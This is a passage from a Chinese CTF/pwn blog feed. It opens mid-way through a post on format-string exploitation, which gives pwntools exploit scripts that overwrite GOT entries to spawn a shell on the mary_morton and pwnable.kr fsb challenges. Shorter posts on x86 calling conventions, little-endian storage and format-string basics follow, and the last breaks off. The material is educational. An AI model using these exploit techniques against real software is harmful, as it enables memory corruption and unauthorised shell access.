class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我写这道题的思路有两个：可以利用格式化串漏洞修改printf函数的got表，将其修改为system函数的plt，再次执行fsb函数时，输入/bin/sh，则可以拿到shell。<br>也可以修改_stack_chk_fail 的got表，将其修改为这个后门函数的地址，当执行Stackoverflow函数时，破坏掉canary，则会执行后门函数。<br>exp采用的是思路1：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="comment">#a=remote("111.198.29.45","31730")</span></span><br><span class="line"><span class="keyword">a</span>=<span class="built_in">process</span>(<span class="string">"./mary_morton"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./mary_morton"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">a</span>.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">"printf"</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">"system"</span>]</span><br><span class="line">length2=<span class="built_in">len</span>(str(system_plt))</span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">8</span>-length2)+<span class="string">'%'</span>+str(system_plt<span class="number">-8</span>+length2)+<span class="string">'c'</span>+<span class="string">"%8$lln"</span>+p64(printf_got)</span><br><span class="line">print payload</span><br><span class="line"><span class="keyword">a</span>.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="keyword">a</span>.recv()</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="keyword">a</span>.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="格式化串不在栈中："><a href="#格式化串不在栈中：" class="headerlink" title="格式化串不在栈中："></a>格式化串不在栈中：</h3><p>某些时候你输入的格式化串不是保存在栈中的，这些字符串可能保存在bss段或者堆中，那么你使用多少%p，都不能找到你写入的格式化串。例如：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">   <span class="built_in">printf</span>(a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的字符串a，就是全局变量，保存在bss段。<br><img src="/2019/02/22/格式化串漏洞利用总结/7.png" alt=""><br>不管你用多少%p，都找不到这个格式化串。<br>这样就需要找个跳板——栈中保存的EBP/RBP。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>当函数初始化完成后(对汇编函数调用过程不了解请看原先笔记)，在当前函数栈帧中，EBP指向上一个函数栈帧的EBP，即saved EBP。如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/8.png" alt=""><br>那么就可以将saved ebp指向的内存修改为你想要修改的内存单元的地址。即第一次利用格式化串漏洞，将想要修改的内存单元的指针写入栈中。<br>例如，你想修改某个函数的got表项，第一次修改后如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/9.png" alt=""><br>因为saved ebp 本来就保存在栈中，且当前EBP和printf的参数——格式化串的距离是固定不变的，所以可以直接使用 <code>%number$n</code>找到saved ebp，将saved ebp指向的内存单元修改掉。<br>又因为上一个函数的EBP，即当前函数的栈帧中保存的saved ebp，和printf的参数也是固定不变的，所以第二次利用格式化串找到第一次修改的地址，即可修改目标，如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/10.png" alt=""><br>图中的4和9，都是随便写的，具体数值需要根据题目调试出来。</p><p>利用模板如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次漏洞利用：</span><br><span class="line">payload='%'+str(想要修改的内存单元的地址)+‘c’+‘%offset1$n’</span><br><span class="line">offset1= 格式化串和EBP的偏移</span><br><span class="line"><span class="section">第二次漏洞利用:</span></span><br><span class="line">payload='%'+str(想要修改的数值)+‘c’+<span class="string">"%offset2$n"</span></span><br><span class="line">offset2= 格式化串和saved ebp的偏移</span><br></pre></td></tr></table></figure></p><p>其中第一次漏洞利用是将地址写入栈中，第二次才是真正的修改。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>pwnable.kr 中的fsb，就是格式化串不在栈中的。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;alloca.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsb</span><span class="params">(<span class="keyword">char</span>** argv, <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* args[]=&#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span>*** pargv = &amp;argv;</span><br><span class="line"><span class="keyword">char</span>*** penvp = &amp;envp;</span><br><span class="line">        <span class="keyword">char</span>** arg;</span><br><span class="line">        <span class="keyword">char</span>* c;</span><br><span class="line">        <span class="keyword">for</span>(arg=argv;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">for</span>(arg=envp;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">*pargv=<span class="number">0</span>;</span><br><span class="line">*penvp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me some format strings(%d)\n"</span>, i+<span class="number">1</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf); <span class="comment">//漏洞在这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wait a sec...\n"</span>);</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"key : \n"</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf2, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pw = strtoull(buf2, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(pw == key)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">                execve(args[<span class="number">0</span>], args, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect key \n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>( fd==<span class="number">-1</span> || read(fd, &amp;key, <span class="number">8</span>) != <span class="number">8</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">alloca(<span class="number">0x12345</span> &amp; key);<span class="comment">//在栈中申请空间，申请的大小是随机化的</span></span><br><span class="line">fsb(argv, envp); <span class="comment">// exploit this format string bug!</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用思路就是将sleep函数的got表项修改为execve(“/bin/sh”,0,0)的地址。<br>百度了一下alloca这个函数，是在栈中申请空间，类似于malloc，由于这个申请的栈空间的大小是不一定的，也就是说fsb这个函数栈帧的基地址EBP和ESP都是不确定的，则需要通过泄露栈中数据计算出offset。<br>在printf处下个断点。<br><img src="/2019/02/22/格式化串漏洞利用总结/12.png" alt=""><br>此时esp指向的是格式化字符串。<br>通过泄露图中0xfffeccf8所指向的内容再减去80，即可算出ESP，再泄露出saved ebp，两者相减再除以4，即可算出offset。<br>对应的payload的如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br></pre></td></tr></table></figure></p><p>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">p=ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')</span><br><span class="line">sleep_got=0x0804a008</span><br><span class="line">system=0x080486ab</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(1)\n"</span>) <span class="comment">#第一次利用，计算offset</span></span><br><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(2)\n"</span>)</span><br><span class="line">payload=<span class="string">"%134520840c"</span>+<span class="string">"%18$n"</span> <span class="comment">#修改saved ebp所指向的内容为sleep表项地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(3)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAA%134514344c"</span>+<span class="string">"%"</span>+str(offset)+<span class="string">"$n"</span> <span class="comment">#修改为getshell的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(4)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。&lt;br&gt;格式化字符串漏洞的利
      
    
    </summary>
    
    
      <category term="pwnable" scheme="http://yoursite.com/tags/pwnable/"/>
    
      <category term="fmtstr" scheme="http://yoursite.com/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编 函数调用</title>
    <link href="http://yoursite.com/2019/02/11/x86%E6%B1%87%E7%BC%96-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/"/>
    <id>http://yoursite.com/2019/02/11/x86汇编-函数调用/</id>
    <published>2019-02-11T09:05:59.000Z</published>
    <updated>2019-02-11T09:12:13.127Z</updated>
    
    <content type="html"><![CDATA[<p>函数调用一般有个模板。</p><pre><code>push ebpmov ebp,esp//这里提升堆栈sub esp,0x40  //这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。push edipush esipush ebx//保留现场lea edi, dword ptr ss:[ebp-0x40]mov ecx,0x10mov eax,0xccccccccrep stos dowrd ptr es:[edi]//填充缓冲区----------------这里是写函数的功能----------------    pop ebx    pop esi    pop edi    //恢复现场    mov esp,ebp    pop ebp    ret</code></pre><p>执行完上面代码，堆栈图差不多就是这个样子，（该图，下面是高址，上面是低址）<br>中间的ccc….就是填充缓冲区。填充后可以用来写入局部变量。<br>EBP后面的高址，存有恢复用的EIP，和call函数前push的参数。<br>EBP前面的低址，用来存局部变量。</p><p><img src="/2019/02/11/x86汇编-函数调用/1.png" alt=""></p><hr><p>根据函数调用约定的不同，平衡堆栈的方式不同<br>如果是__cedcl约定，是在母函数中平衡堆栈，就是函数调用完返回后，在调用者的函数体内 add esp，xx 来平衡堆栈。<br>例如母函数体内：<br> <code>push xx call 子函数 add esp,0x4</code></p><p>有几种函数调用约定，不同的调用约定，参数的传递，堆栈的平衡方式不同。下面是三种常见的调用约定：<br><strong>__cedcl 约定</strong><br>参数从右往左，依次入栈。堆栈平衡在母函数中完成。<br>在函数调用前，将参数压栈。<br><code>push xxxpush xxx...然后call 函数。//函数执行完毕add esp ，xx//在母函数中平衡堆栈</code></p><p><strong>stdcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈。<br>参数还是在调用前push 入栈。<br>平衡堆栈时，在 子函数 ret 后加个 xx  恢复堆栈<br>例如 ret   0x8，相当于 pop eip     add esp，0x8 </p><p><strong>fastcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈<br>参数1个或者两个用 寄存器 传参，多于两个，多余两个的部分还是压栈传参。<br>例如  func(int a,int b,int c)<br><code>push cmov eax,bmov ecx,a</code><br>然后再call 函数，最后在子函数中平衡堆栈。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;函数调用一般有个模板。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;push ebp
mov ebp,esp
//这里提升堆栈
sub esp,0x40  
//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。
push edi
push esi
push ebx
//保留现场
lea
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>深入理解little-endian</title>
    <link href="http://yoursite.com/2019/02/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3little-endian/"/>
    <id>http://yoursite.com/2019/02/11/深入理解little-endian/</id>
    <published>2019-02-11T08:59:32.000Z</published>
    <updated>2019-02-11T09:02:28.476Z</updated>
    
    <content type="html"><![CDATA[<p>little-endian 简单来说即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。</p><p>首先，明确一点，最小的单元都是字节；数据在内存中的存放是以字节为单位的。字节内的内容<strong>没有</strong>所谓的高位高址，低位低址。</p><p>在内存中存放数据时，先将这个数据拆分为一个一个的字节。再将高位字节放在高址，低位字节放低址。</p><p>要注意内存数据（数据在内存中实际位置）和 数值数据（实际应用的数值）的区别。真实内存中数据的存放是高位放高址，低位放低址。 而变为数值数据时是从高位到低位连起来的，例如 原本数据是int a=0x12345678，而实际放在内存中是  78 56 34 12 ，将其作为数值应用时，要将高位从低位连起来。更直观点是这样的。</p><p><img src="/2019/02/11/深入理解little-endian/1.png" alt=""></p><p>再来看看数值数据是如何转变的。</p><p><img src="/2019/02/11/深入理解little-endian/2.png" alt=""></p><p>内存中真实存储情况是这样的，但是应用为数据时（即这一格代表的数是多少）要从高址到低址读，即EBP-4这一格代表的数据是12345678。<br>在一些调试器上，例如ollydbg中，显示一格对应的数据时，一般已经转化为应用数据了（例如OD的堆栈窗口），而不是内存中的真实存储情况，这一点要清楚。</p><p>还需要清楚知道的是little-endian的存放机制的对象是<strong>单个元素的数值在内存的存放</strong>。 <em>对数组的元素的存放需要区别。</em></p><p><strong>数组的寻址公式是 ：首元素的地址+ n * 数组单个元素所占字节数。</strong>所以数组的存放是高位的<strong>元素</strong>在低址，低位的<strong>元素</strong>在高址。这里要和单个元素的存放区别开。<br>例如 char a[5]=”abcde”;<br>则元素在内存中的存储是</p><p><img src="/2019/02/11/深入理解little-endian/3.png" alt=""></p><p>再例如 int a[3]={0xaabbccdd,0xbbccddee,0xccddeeff};<br>则在内存中存储是</p><p><img src="/2019/02/11/深入理解little-endian/4.png" alt=""></p><p>这两个例子中都是真实存储情况，不是应用数值。<br>后者这个例子中，每个元素的存储方式还是按照little-endian的方式存储。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;little-endian 简单来说即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。&lt;/p&gt;
&lt;p&gt;首先，明确一点，最小的单元都是字节；数据在内存中的存放是以字节为单位的。字节内的内容&lt;strong&gt;没有&lt;/strong&gt;所谓的高位高址，低位低址。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基本格式化字符串漏洞原理</title>
    <link href="http://yoursite.com/2019/02/11/%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2019/02/11/基本格式化字符串漏洞原理/</id>
    <published>2019-02-11T08:42:00.000Z</published>
    <updated>2019-02-26T12:26:37.566Z</updated>
    
    <content type="html"><![CDATA[<p>理解这个漏洞的原理，你需要有汇编层面的函数调用和函数的参数传递知识。如果你不清楚函数的参数是如何传递的，可以看《加密与解密》的逆向分析技术篇。</p><p>再说格式化字符串漏洞之前，先了解一下printf函数和利用该漏洞的重要 格式化字符串%n，利用他可以做到几乎任意内存写入。</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><p>int printf (“格式化字符串”,参量… )<br>函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。<br>参量表中参数的个数是不定的（<em>如何实现参数的个数不定，可以参考《程序员的自我修养》这本书</em>），可以是一个，可以是两个，三个…..，<strong>也可以没有参数</strong>。<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。<br>但是有个不常见的格式化字符串 <strong>%n</strong> ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。</p><p><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是指针指向的地方开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟 程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，地址的长度是不同的。</p><p>具体实例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/1.png" alt=""></p><p>%n之前打印了5个a，所以n的值变成了5。</p><p>了解了这些后就可以说下格式化字符串漏洞了。</p><h3 id="漏洞成因和基本原理"><a href="#漏洞成因和基本原理" class="headerlink" title="漏洞成因和基本原理"></a>漏洞成因和基本原理</h3><p>正确使用printf是这样的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但也有人会懒省事，写成这样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[]=<span class="string">"neuqcsa"</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实参与函数形参的结合顺序是从左往右依次进行的，所以上面的代码也能输出：</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/2.png" alt=""></p><p>上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户输入的字符串是”%x%x%x”，则会输出以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/3.png" alt=""></p><p>输出的结果是 内存中的数据。</p><p>看一下调用printf函数后的堆栈图：（cdecl调用方式，参数从右往左依次入栈）</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/4.png" alt=""></p><p>在OD中可以清晰的看到：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/5.png" alt=""></p><p><strong>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。</strong></p><p>所以尽管没有参数，上面的代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><h3 id="任意内存的读取及任意内存写入："><a href="#任意内存的读取及任意内存写入：" class="headerlink" title="任意内存的读取及任意内存写入："></a>任意内存的读取及任意内存写入：</h3><p> 任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。</p><p>在说任意内存的读取之前要知道 <strong>局部变量是存储在栈中</strong>，这点很关键。所以一定可以找到我们所输入的格式化字符串。<br>例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/6.png" alt=""></p><p>看下堆栈图：<br>这是调用scanf函数前的堆栈图。</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/7.png" alt=""></p><p>输入字符串后的堆栈图：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/8.png" alt=""></p><p>调用printf函数的过程：</p><pre><code>mov eax，数组首地址push eax  call printf</code></pre><p>该过程只是将数组的首地址入栈，此时堆栈图如下。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/9.png" alt=""><br>所以在格式化字符串里用很多的%x 就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p><p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br>%&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/10.png" alt=""></p><p>图中是第六个参数是41414141。</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/11.png" alt=""></p><p>同样可以得到41414141。这样就方便的多了。</p><h4 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h4><p>有了上面内容的铺垫就可以学任意读取了：<br>看下面的代码：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/12.png" alt=""></p><p>从命令行输入字符串后，将该字符串复制到a内，再直接打印a；<br>输入的字符串的前4个字节如果是一个有效的字符串的首地址，就可以用%s将其打印出来，做到任意内存读取。如果不是有效的字符串，会出现段错误。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/13.png" alt=""></p><p><strong>如何写入地址，需要用到linux自带的printf命令，将shellcode编码转义为字符</strong>。（注意用反引号将printf命令括住，反引号在Tab键的上面，反引号内的内容会被当做命令执行。）<br><strong>如果是用scanf输入字符串，则无法使用printf命令，只能对照ascii码表，scanf和命令行输入的shellcode编码不能直接被转义。（所以为了方便演示，后面都使用了命令行输入参数）</strong><br>写入地址实例：<br><img 